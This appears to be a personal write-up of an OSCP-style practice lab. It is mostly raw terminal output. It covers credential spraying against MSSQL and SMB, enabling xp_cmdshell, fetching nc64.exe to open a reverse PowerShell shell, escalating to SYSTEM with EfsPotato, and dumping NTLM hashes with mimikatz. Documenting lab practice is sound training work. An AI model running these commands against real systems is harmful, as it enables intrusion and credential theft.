[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Admin:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\web_svc:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\sql_svc:Freedom1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Administrator:Diamond1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Guest:Diamond1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\DefaultAccount:Diamond1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\WDAGUtilityAccount:Diamond1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Mary.Williams:Diamond1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\support:Diamond1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\cloudbase-init:Diamond1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Admin:Diamond1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [+] oscp.exam\web_svc:Diamond1 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\sql_svc:Diamond1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Administrator:Dolphin1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Guest:Dolphin1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\DefaultAccount:Dolphin1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\WDAGUtilityAccount:Dolphin1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Mary.Williams:Dolphin1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\support:Dolphin1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\cloudbase-init:Dolphin1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] oscp.exam\Admin:Dolphin1 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [+] oscp.exam\sql_svc:Dolphin1 (Pwn3d!)

[*] Testing mssql (local-auth)...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam) (EncryptionReq:False)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Administrator:December31 (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Guest:December31 (Login failed for user 'Guest'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\DefaultAccount:December31 (Login failed for user 'DefaultAccount'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\WDAGUtilityAccount:December31 (Login failed for user 'WDAGUtilityAccount'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Mary.Williams:December31 (Login failed for user 'Mary.Williams'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\support:December31 (Login failed for user 'support'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\cloudbase-init:December31 (Login failed for user 'cloudbase-init'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Admin:December31 (Login failed for user 'Admin'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\web_svc:December31 (Login failed for user 'web_svc'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\sql_svc:December31 (Login failed for user 'sql_svc'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Administrator:Freedom1 (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Guest:Freedom1 (Login failed for user 'Guest'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\DefaultAccount:Freedom1 (Login failed for user 'DefaultAccount'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\WDAGUtilityAccount:Freedom1 (Login failed for user 'WDAGUtilityAccount'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Mary.Williams:Freedom1 (Login failed for user 'Mary.Williams'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\support:Freedom1 (Login failed for user 'support'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\cloudbase-init:Freedom1 (Login failed for user 'cloudbase-init'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Admin:Freedom1 (Login failed for user 'Admin'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\web_svc:Freedom1 (Login failed for user 'web_svc'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\sql_svc:Freedom1 (Login failed for user 'sql_svc'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Administrator:Diamond1 (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Guest:Diamond1 (Login failed for user 'Guest'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\DefaultAccount:Diamond1 (Login failed for user 'DefaultAccount'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\WDAGUtilityAccount:Diamond1 (Login failed for user 'WDAGUtilityAccount'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Mary.Williams:Diamond1 (Login failed for user 'Mary.Williams'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\support:Diamond1 (Login failed for user 'support'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\cloudbase-init:Diamond1 (Login failed for user 'cloudbase-init'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Admin:Diamond1 (Login failed for user 'Admin'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\web_svc:Diamond1 (Login failed for user 'web_svc'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\sql_svc:Diamond1 (Login failed for user 'sql_svc'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Administrator:Dolphin1 (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Guest:Dolphin1 (Login failed for user 'Guest'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\DefaultAccount:Dolphin1 (Login failed for user 'DefaultAccount'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\WDAGUtilityAccount:Dolphin1 (Login failed for user 'WDAGUtilityAccount'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Mary.Williams:Dolphin1 (Login failed for user 'Mary.Williams'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\support:Dolphin1 (Login failed for user 'support'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\cloudbase-init:Dolphin1 (Login failed for user 'cloudbase-init'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\Admin:Dolphin1 (Login failed for user 'Admin'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\web_svc:Dolphin1 (Login failed for user 'web_svc'. Please try again with or without '--local-auth')
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
MSSQL       10.10.135.148   1433   MS02             [-] MS02\sql_svc:Dolphin1 (Login failed for user 'sql_svc'. Please try again with or without '--local-auth')

[*] Testing ftp ...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:21 <--socket error or timeout!

[*] Testing ftp (local-auth)...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth
[ble: exit 2][ble: elapsed 173.490s (CPU 19.7%)] for proto in smb winrm wmi rdp ssh ldap mssql ftp; do 

```

enable account

```
SMB         10.10.135.148   445    MS02             [+] oscp.exam\web_svc:Diamond1 
RPC         10.10.135.148   135    MS02             [+] oscp.exam\web_svc:Diamond1 
MSSQL       10.10.135.148   1433   MS02             [+] oscp.exam\web_svc:Diamond1 
MSSQL       10.10.135.148   1433   MS02             [+] oscp.exam\sql_svc:Dolphin1 (Pwn3d!)
SMB         10.10.135.148   445    MS02             [+] oscp.exam\sql_svc:Dolphin1 
RPC         10.10.135.148   135    MS02             [+] oscp.exam\sql_svc:Dolphin1 

```

### SMB

```autohotkey
smbclient 10.10.135.148   445    MS02             [+] oscp.exam\web_svc:Diamond1 
```

nothing special

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $proxychains4 smbclient -L //10.10.135.148/ -U 'oscp.exam\web_svc%Diamond1'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:139  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:139  ...  OK
do_connect: Connection to 10.10.135.148 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $proxychains4 smbclient -L //10.10.135.148/ -U 'oscp.exam\sql_svc%Dolphin1'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:139  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:139  ...  OK
do_connect: Connection to 10.10.135.148 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

### MSSQL

{{< toggle "Tag 🏷️" >}}

{{< tag "null" >}} Login the target as mssqlclient.py with prochians4

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $proxychains4 /usr/share/doc/python3-impacket/examples/mssqlclient.py web_svc:Diamond1@10.10.135.148 -windows-auth

 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (OSCP\web_svc  guest@master)> 

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $proxychains4 /usr/share/doc/python3-impacket/examples/mssqlclient.py sql_svc:Dolphin1@10.10.135.148 -windows-auth
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (OSCP\sql_svc  dbo@master)> 

```

### shell

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-xp-cmdshell-RCE" >}} The mssql allow to run the linux command , so downloading the nc64.exe to have RCE

{{< /toggle >}}

Enable the command execute function

```
SQL (OSCP\sql_svc  dbo@master)> xp_cmdshell whoami
ERROR(MS02\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (OSCP\sql_svc  dbo@master)> enable_xp_cmdshell
INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\sql_svc  dbo@master)> xp_cmdshell whoami
output                        
---------------------------   
nt service\mssql$sqlexpress   

NULL                         
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Ligolo-Proxy-port-forward" >}} After using the Port Forward , our ip is autoroute 's ip which is 10.10.135.147 , and open the python wfeb sharing for download the file

{{< /toggle >}}

```
[Agent : OSCP\eric.wallows@MS01] » autoroute 
? Select routes to add: 10.10.135.147/24

[Agent : OSCP\eric.wallows@MS01] » listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999
INFO[0156]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/app.go:617 github.com/nicocha30/ligolo-ng/cmd/proxy/app.Run.func14() Listener 0 created on remote agent!    
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $ python3 -m http.server 9999
```

```
SQL (OSCP\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c "curl.exe http://10.10.135.147:9999/nc64.exe -o C:\Users\Public\nc64.exe';
output                                                                                                                                                           
--------------------------------------------------------------------------------------------------------------------------------------------------------------   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                  

                                 Dload  Upload   Total   Spent    Left  Speed                                                                                    

100 45272  100 45272    0     0   121k      0 --:--:-- --:--:-- --:--:--  121k   

NULL                                                                                                                                                             


```

Download the nc64.exe

```
SQL (OSCP\sql_svc  dbo@master)> EXEC xp_cmdshell "C:\Users\Public\nc64.exe 10.10.135.147 1234 -e powershell";
output   
------   
NULL     

```

Receive the RCE

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $sudo rlwrap nc -nlvp 1234
Listening on 0.0.0.0 9999
Connection received on 127.0.0.1 46928
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami 
whoami 
nt service\mssql$sqlexpress
PS C:\Windows\system32> 

```

SeImpersonatePrivilege is out standing

```
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

download the EfsPotato.exe

```
PS C:\Windows\system32> curl.exe http://10.10.135.147:9999/EfsPotato.exe -o C:\Users\Public\EfsPotato.exe
curl.exe http://10.10.135.147:9999/EfsPotato.exe -o C:\Users\Public\EfsPotato.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 17920  100 17920    0     0  85683      0 --:--:-- --:--:-- --:--:-- 86153

```

using the port  1234 for Admin RCE

```
SQL (OSCP\sql_svc  dbo@master)> EXEC xp_cmdshell "C:\Users\Public\nc64.exe 10.10.135.147 1234 -e powershell";
output   
------   
NULL     

SQL (OSCP\sql_svc  dbo@master)> EXEC xp_cmdshell 'C:\Users\Public\EfsPotato.exe  "C:\Users\Public\nc64.exe 10.10.135.147 1234 -e powershell"';


```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $sudo rlwrap nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 127.0.0.1 41882
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami 
whoami 
nt authority\system
PS C:\Windows\system32> 

```

### Mimikatz

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Mimikatz-1" >}} With Admin power to run the sekurlsa::logonpasswords to do the windows internal 's LSA attack , to have the username of Administrator NTLM

{{< /toggle >}}

```
PS C:\Programdata> curl http://10.10.135.147:9999/mimikatz.exe  -o C:\Programdata\mimikatz.exe
```

```
PS C:\Programdata> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 568136 (00000000:0008ab48)
Session           : Batch from 0
User Name         : cloudbase-init
Domain            : MS02
Logon Server      : MS02
Logon Time        : 7/4/2026 3:49:04 PM
SID               : S-1-5-21-2512333080-3128024849-3533006164-1003
	msv :	
	 [00000003] Primary
	 * Username : cloudbase-init
	 * Domain   : MS02
	 * NTLM     : ea9b1799bd62290a718b59362c4135b0
	 * SHA1     : bd7cad8fa1c2f53d62bfff59f244bd2da007bccd
	tspkg :	
	wdigest :	
	 * Username : cloudbase-init
	 * Domain   : MS02
	 * Password : (null)
	kerberos :	
	 * Username : cloudbase-init
	 * Domain   : MS02
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 379331 (00000000:0005c9c3)
Session           : Interactive from 1
User Name         : Administrator
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 7/4/2026 3:48:59 PM
SID               : S-1-5-21-2610934713-1581164095-2706428072-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : OSCP
	 * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
	 * SHA1     : f41a495e6d341c7416a42abd14b9aef6f1eb6b17
	 * DPAPI    : 959ad2ea78c63aebf3233679ad90d769
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 122717 (00000000:0001df5d)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:52 PM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
	msv :	
	 [00000003] Primary
	 * Username : MS02$
	 * Domain   : OSCP
	 * NTLM     : 2762b6bb841ccd9ec59844c0217ba338
	 * SHA1     : 488806ab84ef6aa2ae41ad309152eed9b70afe3e
	tspkg :	
	wdigest :	
	 * Username : MS02$
	 * Domain   : OSCP
	 * Password : (null)
